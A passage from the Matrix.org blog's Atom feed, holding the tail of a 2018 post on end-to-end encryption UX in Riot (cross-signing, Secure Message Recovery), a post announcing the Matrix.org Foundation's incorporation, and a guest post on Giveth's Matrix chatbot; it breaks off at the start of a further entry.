&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;(For some users, restrictions such as limiting the number of places encryption keys reside, and not having a synchronised message history may be desirable &lt;&#x2F;span&gt;
&lt;i&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;security features.&lt;&#x2F;span&gt;
&lt;&#x2F;i&gt;&lt;span style=&quot;font-weight: 400&quot;&gt; We&#x27;ll support these cases, but just not as the default behaviour.)&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Let&#x27;s dive in to some of the fundamental concepts we&#x27;ll be putting forward to deliver a default end-to-end encryption experience that makes sense for most modern users. In this post we&#x27;ll look at an overview of&lt;&#x2F;span&gt;
&lt;b&gt; work-in-progress wireframes&lt;&#x2F;b&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;, in the spirit of designing in the open and gathering feedback from the wider Matrix community. Please note that these don&#x27;t represent the actual interface design.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;cross-signing-personal-devices&quot;&gt;Cross-signing personal devices&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Cross-signing.png&quot;&gt;&lt;img class=&quot;alignnone wp-image-3708 size-large&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Cross-signing-1024x576.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;576&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;When logging in to a new device, you&#x27;ll be able to use an existing device to verify your new one. Verification is done by &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1543&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;scanning a QR code&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt; on whichever device has the most convenient camera to use, or by &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1267&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;comparing a short text string&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;. You only have to complete this process once to mutually verify both devices.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1680&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Verifying your new device by cross-signing&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt; transfers encryption keys, giving it access to your encrypted messages, and also signals to other users that the new device is trustworthy.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;secure-message-recovery&quot;&gt;Secure Message Recovery&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Secure-Message-Recovery.gif.gif&quot;&gt;&lt;img class=&quot;alignnone size-large wp-image-3725&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Secure-Message-Recovery.gif.gif&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;577&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;To the end user, Secure Message Recovery works a lot like setting up disk encryption or a password manager. A user can optionally secure their message history using a recovery passphrase and&#x2F;or key. If logged out, or using another device, the user can use the recovery passphrase or key to access their encrypted message history.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;In practise, this &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;5675&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;incrementally encrypts and backs up encryption keys to a user&#x27;s homeserver&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;, kept secure by the homeserver never having access to the passphrase or key. Like cross-signing, using a recovery passphrase or key will also signal to other users that a device is trustworthy.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;We think that in most cases users will cross-sign personal devices, but as a safety net (for example, if a user&#x27;s devices are broken or lost) Secure Message Recovery is an invaluable tool for users to minimise the chance of them losing their encrypted message history.
&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;people-should-trust-people&quot;&gt;People should trust people&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Verification.gif&quot;&gt;&lt;img class=&quot;alignnone size-large wp-image-3726&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Verification.gif&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;577&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;With both cross-signing and Secure Message Recovery in place, we think that people should trust people, instead of individual devices. Now, when you verify a device, it&#x27;ll mark all of that users trusted devices as trusted.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Gone are the days of every person you talk to having to independently verify your new device upgrade. Like cross-signing, you can verify a device by scanning a QR code or comparing a short text string.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sensible-and-extensible&quot;&gt;Sensible and extensible&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Settings.gif&quot;&gt;&lt;img class=&quot;alignnone size-large wp-image-3727&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;E2E-UX-Settings.gif&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;577&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;In Riot, we&#x27;re implementing these features with a sensible default experience that strikes a balance between usability and security. We think most people would prefer to trust cross-signed devices, and that user trust shouldn&#x27;t block encryption. However, if you aren&#x27;t most people, you&#x27;ll be free to configure whatever level of security you need.
&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;in-summary&quot;&gt;In Summary&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;With all of the above in place, and after resolving any remaining technical issues, users will be able to:&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Use end-to-end encryption by default in private rooms.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Use an existing device or Secure Message Recovery to access their encrypted message history on multiple devices, and to signal device trust to other users.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Access their encrypted message history using Secure Message Recovery, by storing encrypted message keys on their homeserver.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Mark a user as trusted by verifying one of their devices, persisting across all rooms and devices.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;Keep their encrypted messages out of the hands of eavesdroppers.&lt;&#x2F;li&gt;
 	&lt;li&gt;Opt out, or further configure if they have more specific security requirements.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span style=&quot;font-weight: 400&quot;&gt;There&#x27;s more nuance to making all this work than we can cover in this overview post; things like recovery key management and immutable security notifications are all important pieces of the puzzle. For further reading, we&#x27;re filling up more detail in &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;1TIZarCxP0UHcn52o3YdKrFs_ESB3YvDxvCY_SoY-FUk&#x2F;edit?usp=sharing&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;UX reference documentation&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;, &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;xd.adobe.com&#x2F;view&#x2F;aa55e61a-c9b5-4ab2-5d45-71e40b5447dc-dc64&#x2F;&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;interactive wireframes&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;, &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-meta&#x2F;issues&#x2F;222&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;GitHub issues&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt; and a &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;spreadsheets&#x2F;d&#x2F;1Bv2Pf4rz62nB8omDFoolRmONmU47zIeGewJBbPeADoM&#x2F;edit#gid=0&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;work-in-progress threat model&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;. &lt;&#x2F;span&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;Over the coming days we&#x27;re polishing wireframes, nomenclature, iconography and microcopy as we dig deeper into development and implementation, as well as designing these features for &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@dharmaone&#x2F;redesigning-matrix-riot-chat-c7bffd9eb841&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;the upcoming Riot redesign&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;. Cryptography needn&#x27;t be intimidating, and we&#x27;re excited to iterate on these advanced features to make them work for everyone.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;We&#x27;d love to hear your feedback! Let us know your thoughts here or in &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#e2e-dev:matrix.org&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;#e2e-dev:matrix.org&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Introducing the Matrix.org Foundation (Part 1 of 2)</title>
        <published>2018-10-29T00:00:00+00:00</published>
        <updated>2018-10-29T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/10/29/introducing-the-matrix-org-foundation-part-1-of-2/" type="text/html"/>
        <id>https://matrix.org/blog/2018/10/29/introducing-the-matrix-org-foundation-part-1-of-2/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Back in June we blogged about &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;06&#x2F;20&#x2F;towards-open-governance-for-matrix-org&#x2F;&quot;&gt;the plan of action to establish a formal open governance system&lt;&#x2F;a&gt; for the Matrix protocol: introducing both the idea of the Spec Core Team to act as the neutral technical custodian of the Matrix Spec, as well as confirming the plan to incorporate the Matrix.org Foundation to act as a neutral non-profit legal entity which can act as the legal Guardian for Matrix&#x27;s intellectual property, gather donations to fund Matrix work, and be legally responsible for maintaining and evolving the spec in a manner which benefits the whole ecosystem without privileging any individual commercial concerns.  We published a draft proposal for the new governance model at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1318&quot;&gt;MSC1318: a proposal for open governance of the Matrix.org Spec&lt;&#x2F;a&gt; to gather feedback and to trial during the &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;day-to-day development of the spec&lt;&#x2F;a&gt;. Otherwise, we refocused on getting a 1.0 release of the Spec out the door, given there&#x27;s not much point in having a fancy legal governance process to safeguard the evolution of the Spec when we don&#x27;t even have a stable initial release!&lt;&#x2F;p&gt;
&lt;p&gt;We were originally aiming for end of August to publish a stable release of all Matrix APIs (and thus a so-called 1.0 of the overall standard) - and in the end we managed to &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;09&#x2F;03&#x2F;matrix-spec-update-august-2018&#x2F;&quot;&gt;publish stable releases of 4 of the 5 APIs&lt;&#x2F;a&gt; (Client-Server, Application Service, Identity Service and Push APIs) as well as a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;commits&#x2F;master&#x2F;specification&#x2F;server_server_api.rst&quot;&gt;major overhaul&lt;&#x2F;a&gt; of the Server-Server (SS) API.  However, the SS API work has run on much longer than expected, as we&#x27;ve ended up both redesigning and needing to implement many major changes to to the protocol: the new State Resolution algorithm (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1442&quot;&gt;State Resolution Reloaded&lt;&#x2F;a&gt;) to fix state resets; versioned rooms (in order to upgrade to the new algorithm); changing event IDs to be hashes; and fixing a myriad federation bugs in Synapse.  Now, the remaining work is progressing steadily (you can see the progress over at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;orgs&#x2F;matrix-org&#x2F;projects&#x2F;2&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;orgs&#x2F;matrix-org&#x2F;projects&#x2F;2&lt;&#x2F;a&gt; - although some of the cards are redacted because they refer to non-spec consulting work) - and &lt;strong&gt;the end is in sight&lt;&#x2F;strong&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;So, in preparation for the upcoming Matrix 1.0 release, we&#x27;ve been moving ahead with the rest of the open governance plan - and we&#x27;re happy to announce that as of a few hours ago,&lt;strong&gt; the initial incarnation of The Matrix.org Foundation exists!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;Certificate.png&quot;&gt;&lt;img class=&quot;aligncenter wp-image-3691&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;Certificate-723x1024.png&quot; alt=&quot;&quot; width=&quot;496&quot; height=&quot;702&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now, it&#x27;s important to understand that &lt;strong&gt;this process is not finished &lt;&#x2F;strong&gt;- what we&#x27;ve done is to set up a solid initial basis for the Foundation in order to finish refining &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1318&quot;&gt;MSC1318&lt;&#x2F;a&gt; and turning it into the full Articles of Association of the Foundation (i.e. the legal framework which governs the remit of the Foundation), which we&#x27;ll be working on over the coming weeks.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, what this means is that in the first phase, today&#x27;s Foundation gives us:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;A UK &lt;strong&gt;non-profit company&lt;&#x2F;strong&gt; - technically incorporated as a &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Private_company_limited_by_guarantee&quot;&gt;private company, limited by guarantee&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Guardians&lt;&#x2F;strong&gt;, whose role is to be legally responsible for ensuring that the Foundation (and by extension the Spec Core Team) keeps on mission and neutrally protects the development of Matrix.  Matrix&#x27;s Guardians form the Board of Directors of the Foundation, and will provide a &#x27;checks and balances&#x27; mechanism between each other to ensure that all Guardians act in the best interests of the protocol and ecosystem.&lt;br&#x2F; &gt;&lt;br &#x2F;&gt;For the purposes of initially setting up the Foundation, the initial Guardians are Matthew &amp; Amandine - but in the coming weeks we&#x27;re expecting to appoint at least three independent Guardians in order to ensure that the current team form a minority on the board and ensure the neutrality of the Foundation relative to Matthew &amp; Amandine&#x27;s day jobs at New Vector.The profile we&#x27;re looking for in Guardians are: folks who are independent of the commercial Matrix ecosystem (and especially independent from &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt;), and may even not be members of today&#x27;s Matrix community, but who are deeply aligned with the mission of the project, and who are respected and trusted by the wider community to uphold the guiding principles of the Foundation and keep the other Guardians honest.&lt;&#x2F;li&gt;
 	&lt;li&gt;An immutable &lt;strong&gt;asset lock&lt;&#x2F;strong&gt;, to protect the intellectual property of the Foundation and prevent it from ever being sold or transferred elsewhere.&lt;&#x2F;li&gt;
 	&lt;li&gt;An immutable &lt;strong&gt;mission lock&lt;&#x2F;strong&gt;, which defines the Foundation&#x27;s mission as a non-profit neutral guardian of the Matrix standard, with an initial formal goal of finalising the open governance process.  To quote article 4 from the initial Articles of Association:
&lt;ul&gt;
 	&lt;li&gt;
&lt;div class=&quot;page&quot; title=&quot;Page 8&quot;&gt;
&lt;div class=&quot;layoutArea&quot;&gt;
&lt;div class=&quot;column&quot;&gt;4. The objects of the Foundation are for the benefit of the community as a whole to:&lt;&#x2F;div&gt;
&lt;div class=&quot;column&quot;&gt;
&lt;p&gt;4.1.1  empower users to control their communication data and have freedom over their communications infrastructure by creating, maintaining and promoting Matrix as an openly standardised secure decentralised communication protocol and network, open to all, and available to the public for no charge;&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;
4.1.2  build and develop an appropriate governance model for Matrix through the Foundation, in order to drive the adoption of Matrix as a single global federation, an open standard unencumbered from any proprietary intellectual property and&#x2F;or software patents, minimising fragmentation (whilst encouraging experimentation), maximising speed of development, and prioritising the long-term success and growth of the overall network over the commercial concerns of an individual person or persons.
&lt;&#x2F;div&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;You can read the initial &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;Constitution.pdf&quot;&gt;Articles of Association&lt;&#x2F;a&gt; here (although all the rest of it is fairly generic legal boilerplate for a non-profit company at this point which hasn&#x27;t yet been tuned; the Matrix-specific stuff is Article 4 as quoted above).  You can also see the initial details of the Foundation straight from the horse&#x27;s mouth over at &lt;a href=&quot;https:&#x2F;&#x2F;beta.companieshouse.gov.uk&#x2F;company&#x2F;11648710&quot;&gt;https:&#x2F;&#x2F;beta.companieshouse.gov.uk&#x2F;company&#x2F;11648710&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Then, in the &lt;strong&gt;next and final phase&lt;&#x2F;strong&gt;, what remains is to:
&lt;ul&gt;
 	&lt;li&gt;Appoint 3+ more Guardians (see above).&lt;&#x2F;li&gt;
 	&lt;li&gt;Finalise&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1318&quot;&gt; MSC1318&lt;&#x2F;a&gt; and incorporate the appropriate bits into the Articles of Associations (AoA).  (We might literally edit MSC1318 directly into the final AoA, to incorporate as much input as possible from the full community)&lt;&#x2F;li&gt;
 	&lt;li&gt;Tune the boilerplate bits of the AoA to incorporate the conclusions of&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1318&quot;&gt; MSC1318&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;Register the Foundation as a &lt;a href=&quot;https:&#x2F;&#x2F;www.gov.uk&#x2F;government&#x2F;organisations&#x2F;office-of-the-regulator-of-community-interest-companies&quot;&gt;Community Interest Company&lt;&#x2F;a&gt;, to further anchor the Foundation as being for the benefit of the wider community.&lt;&#x2F;li&gt;
 	&lt;li&gt;Perform an Asset Transfer of any and all Matrix.org property from New Vector to the Foundation (especially the Matrix.org domain and branding, and donations directed to Matrix.org).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
So there you have it! It&#x27;s been a long time in coming, and huge thanks to everyone for their patience and support in getting to this point, but finally The Matrix.org Foundation exists.  Watch this space over the coming weeks as we announce the Guardians and finish bootstrapping the Foundation into its final long-term form!  Meanwhile, any questions: come ask in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-spec-process:matrix.org&quot;&gt;#matrix-spec-process:matrix.org&lt;&#x2F;a&gt; or in the blog comments here.
&lt;p&gt;thanks,&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine, and the forthcoming Guardians of [the] Matrix!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The story of Giveth’s new Matrix chatbot</title>
        <published>2018-10-11T00:00:00+00:00</published>
        <updated>2018-10-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/10/11/the-story-of-giveth-s-new-matrix-chatbot/" type="text/html"/>
        <id>https://matrix.org/blog/2018/10/11/the-story-of-giveth-s-new-matrix-chatbot/</id>
        
        <content type="html">&lt;p&gt;Guest post today from &lt;a href=&quot;https:&#x2F;&#x2F;giveth.io&#x2F;&quot;&gt;Giveth&lt;&#x2F;a&gt;: &lt;em&gt;Giveth is re-engineering charitable giving, by creating an entirely free, open-source platform, built on the Ethereum Blockchain. Our system cuts out bureaucracy and enables nonprofits to create a high level of transparency and accountability towards Givers.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth1.png&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-3629&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth1.png&quot; alt=&quot;&quot; width=&quot;901&quot; height=&quot;253&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Giveth&#x27;s new chatbot in action!
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Online or offline, joining a new community always requires some adjustment. Even the most open, inclusive communities have shared knowledge and shared practices which new members learn as they participate. &lt;&#x2F;p&gt;
&lt;p&gt;I recently joined &lt;a href=&quot;https:&#x2F;&#x2F;giveth.io&quot;&gt;Giveth&#x27;s&lt;&#x2F;a&gt; Riot community, where the majority of Giveth&#x27;s communication occurs. Immediately upon joining, I received the message pictured above from the Giveth Bot, kindly encouraging me to download Riot mobile and change my notifications to mention-only. The bot shortened my adjustment period by giving me key tidbits of information that everyone in Giveth&#x27;s community knows, but that may have taken me time to pick up on my own. This blog post will cover how the Giveth Bot came to be, what it is capable of, and where the project is headed in the future. &lt;&#x2F;p&gt;
&lt;p&gt;The Giveth Bot actually started out as an attempt to solve a completely different problem: helping Giveth efficiently distribute internal reward points. Giveth&#x27;s system for rewarding people who meaningfully contribute to the project is called RewardDAO. “If someone contributes in a meaningful way, a core contributor from each of the Giveth Campaigns can dish them points to recognize the contribution”, describes &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@cle0&quot;&gt;Cleo&lt;&#x2F;a&gt; in an article explaining &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;giveth&#x2F;how-rewarddao-works-aka-what-are-points-7388f70269a&quot;&gt;how RewardDAO works&lt;&#x2F;a&gt;. At the end of each month, contributors receive Ether based on how many points they have earned.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth2.png&quot;&gt;&lt;img class=&quot;alignnone size-large wp-image-3626&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth2-1024x246.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;246&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;The Giveth RewardDAO motto. Photo from https:&#x2F;&#x2F;medium.com&#x2F;giveth.
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, any time that a core contributor dished points to someone, they had to record who received the points, and how many, on a spreadsheet. In search of a better way, Giveth opened up the project of automating this system to the &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;giveth&#x2F;what-is-social-coding-fa81feacfa32&quot;&gt;social coding hub&lt;&#x2F;a&gt;, a community of altruistic developers looking to tackle impactful and interesting projects, offering a 2 eth bounty for a solution.&lt;&#x2F;p&gt;
&lt;p&gt;A lot of great work was submitted, and ultimately Deam&#x27;s (
&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;deamlabs&quot;&gt;@deamlabs&lt;&#x2F;a&gt;) code was chosen to power the bot and the code for the pointsbot itself was further developed and refined by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;FrederikBolding&quot;&gt;Frederik Bolding&lt;&#x2F;a&gt;. Now, by using a command of the form “!dish [number] [type] points to [contributor] for [contribution]”, Giveth core contributors can distribute points as needed, and the bot will automatically update the spreadsheet accordingly.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth3.png&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-3628&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;10&#x2F;giveth3.png&quot; alt=&quot;&quot; width=&quot;918&quot; height=&quot;520&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;The Giveth Bot dishing points like a champion! 
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Once the bot&#x27;s framework was established, chatbot features were added. In addition to the welcome message I received, the bot gives custom welcome messages in each of Giveth&#x27;s different rooms, allows Matrix users to have 1-on-1 chats with it, and listens for keywords and sentences it recognizes in rooms and private chats. Riot is built on top of an open-source protocol called Matrix. Matrix has a javascript standard development kit (SDK), which the bot uses to detect events occurring in each of the Riot rooms and chats that it is a part of.&lt;&#x2F;p&gt;
&lt;p&gt;Giveth began by using Slack, but switched to Riot to support Matrix&#x27;s decentralized, open-source model, which which aligns far more with Giveth&#x27;s own business model and values. The Giveth Bot is a great example of how Matrix enables users to build their own solutions to problems. In the future, we hope that the Giveth Bot will be able to interact directly with the Ethereum Blockchain, and that more analytics and measurement tools can be incorporated. And of course, we welcome any and all feedback on the Giveth Bot!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Giveth is an open-source platform for building decentralized altruistic communities. Anyone interested in getting involved should head to 
&lt;&#x2F;i&gt;&lt;a href=&quot;https:&#x2F;&#x2F;giveth.io&#x2F;join&#x2F;&quot;&gt;&lt;i&gt;join.giveth.io
&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Interested in checking out the Giveth Bot&#x27;s inner workings? All code is available at 
&lt;&#x2F;i&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Giveth&#x2F;giveth-bot&quot;&gt;&lt;i&gt;https:&#x2F;&#x2F;github.com&#x2F;Giveth&#x2F;giveth-bot
&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;&lt;i&gt;. 
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Interested in learning DApp development or helping out with cool projects like the Giveth Bot? Check out the 
&lt;&#x2F;i&gt;&lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;app&#x2F;#&#x2F;room&#x2F;#giveth-social-coding:matrix.org&quot;&gt;&lt;i&gt;social_coding Riot channel
&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;&lt;i&gt;, tell us what you&#x27;re interested in, and help build awesome stuff!
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Recent matrix.org website improvements</title>
        <published>2018-09-05T00:00:00+00:00</published>
        <updated>2018-09-05T00:00:00+00:00</updated>
        <author>
